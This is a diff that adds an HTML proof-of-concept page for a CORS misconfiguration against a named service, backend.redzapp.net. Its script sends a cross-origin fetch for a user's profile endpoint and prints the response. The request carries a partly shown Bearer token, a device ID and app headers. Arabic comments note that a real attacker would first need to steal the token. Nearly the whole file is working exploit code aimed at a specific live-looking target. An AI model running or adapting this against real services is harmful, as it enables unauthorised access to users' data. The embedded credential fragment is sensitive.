@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Misconfiguration PoC - Redzapp</title>
+</head>
+<body>
+    <div style="font-family: sans-serif; margin: 20px;">
+        <h2>CORS Exploit Test (Bearer Token Scenario)</h2>
+        <p>Targeting: <code>backend.redzapp.net</code></p>
+        <hr>
+        <h4>Response Content:</h4>
+        <pre id="result" style="background: #222; color: #0f0; padding: 15px; overflow: auto; max-height: 400px; border-radius: 5px;">
+            Testing CORS configuration...
+        </pre>
+    </div>
+
+    <script>
+        const targetUrl = "https://backend.redzapp.net/api/users/8242?with_follower_status=1&with_following_status=1&with_posts_count=1&with_profile_photo=1";
+        
+        // ملاحظة: في الهجوم الحقيقي، المتصفح لا يملك التوكن إلا لو سرقه المهاجم بطريقة أخرى
+        // لكن لإثبات ضعف الإعدادات (CORS Misconfiguration) للموقع، نستخدم التوكن الخاص بك:
+        const bearerToken = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJyQVJGOWFlelBLMnVRdDlIMzRkVUFYVzhQV0lMZU1ZZGgxTHFPUjh1MDdZIn0..."; // ضع التوكن كاملاً هنا
+
+        fetch(targetUrl, {
+            method: 'GET',
+            headers: {
+                'Authorization': bearerToken,
+                'X-Device': 'B08DB94D-A940-5BC5-932F-405071BEF14D',
+                'X-App-Version': '4.5.0',
+                'X-Platform': 'ios'
+            },
+            mode: 'cors' // طلب مشاركة الموارد
+        })
+        .then(response => {
+            if (response.ok) {
+                return response.text();
+            } else {
+                return "Error: Status " + response.status + " (CORS might be blocking custom headers)";
+            }
+        })
+        .then(data => {
+            document.getElementById("result").innerText = data;
+        })
+        .catch(err => {
+            document.getElementById("result").innerText = "Failed: " + err.message;
+        });
+    </script>
+</body>
+</html>
